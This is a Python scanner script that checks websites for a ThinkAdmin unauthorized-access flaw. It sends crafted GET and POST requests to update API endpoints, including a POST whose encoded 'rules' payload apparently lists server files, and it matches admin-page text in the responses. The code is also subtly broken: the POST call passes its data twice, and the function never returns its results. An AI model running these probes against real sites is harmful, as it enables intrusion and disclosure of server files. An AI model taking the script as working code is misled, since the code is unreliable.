# coding=utf-8
import random
import requests


def check(url):
    results = []
    payload1 = '?s=admin/api.Update/tree'
    payload2 = '?s=admin/api.Update/node'
    payload3 = '?s=admin/'

    try:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        r = requests.get(url + payload1, headers=headers)
        if '成功' in r.text:
            print("成功")
            results.append('thinkadmin_unauthorized_access | ' +
                           url + payload1 + ' | get | ')

        r = requests.post(url + payload2, 'post',
                          data='rules=%5b%22%2e%5c%2f%22%5d', headers=headers)
        if '成功' in r.text:
            print("成功")
            results.append('thinkadmin_unauthorized_access | ' + url +
                           payload2 + ' | post | ' + ' | data: rules=%5b%22%2e%5c%2f%22%5d')

        r = requests.get(url + payload3, headers=headers)
        if '后台首页' in r.text or '文件管理' in r.text or '系统管理' in r.text or '内容管理' in r.text or '系统设置' in r.text:
            print('成功')
            results.append('thinkadmin_unauthorized_access | ' +
                           url + payload3 + ' | get | ')

    except Exception as e:
        return e
